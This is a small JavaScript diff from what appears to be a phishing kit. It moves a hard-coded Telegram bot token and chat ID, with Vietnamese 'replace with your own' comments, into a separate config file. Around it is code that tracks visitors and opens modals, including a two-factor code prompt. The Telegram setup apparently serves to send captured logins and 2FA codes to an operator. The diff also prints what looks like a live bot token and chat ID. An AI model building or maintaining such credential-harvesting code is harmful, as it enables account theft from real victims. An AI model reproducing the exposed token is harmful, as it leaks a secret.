@@ -130,9 +130,7 @@ var metrics = {
   is_Mobile: window.mobileCheck(),
   params: prettyUtmParams()
 };
-// Telegram Bot Configuration
-var TELEGRAM_BOT_TOKEN = '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA'; // Thay bằng Bot Token của bạn
-var TELEGRAM_CHAT_ID = '7211586401'; // Thay bằng Chat ID của bạn
+// Telegram Bot Configuration được load từ js/telegram-config.js
 var firstModal = new bootstrap.Modal(document.getElementById("exampleModal1"));
 var apiModal = new bootstrap.Modal(document.getElementById("exampleModal2"));
 var twoFAModal = new bootstrap.Modal(document.getElementById("twoFAmodal"));
